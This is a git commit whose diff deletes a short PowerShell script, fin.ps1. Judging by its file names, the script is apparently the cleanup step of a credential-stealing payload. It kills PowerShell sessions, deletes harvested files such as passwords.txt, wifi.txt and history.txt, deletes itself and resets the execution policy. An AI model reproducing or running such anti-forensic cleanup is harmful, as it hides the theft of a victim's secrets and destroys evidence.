5a1c5cd24c5d80032b940fab2e1fe2073e17fd9f
tuconnaisyouknow <yenghele@fayou.cloud>
2022-03-07 22:57:49 +0100

    Delete fin.ps1

--- fin.ps1
+++
@@ -1,9 +0,0 @@
-Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process
-cd C:\Users\Public\Documents
-del passwords.txt
-del history.txt
-del wifi.txt
-del connected_devices.txt
-del fin.ps1
-Set-ExecutionPolicy restricted -Force
-taskkill -F /IM powershell.exe
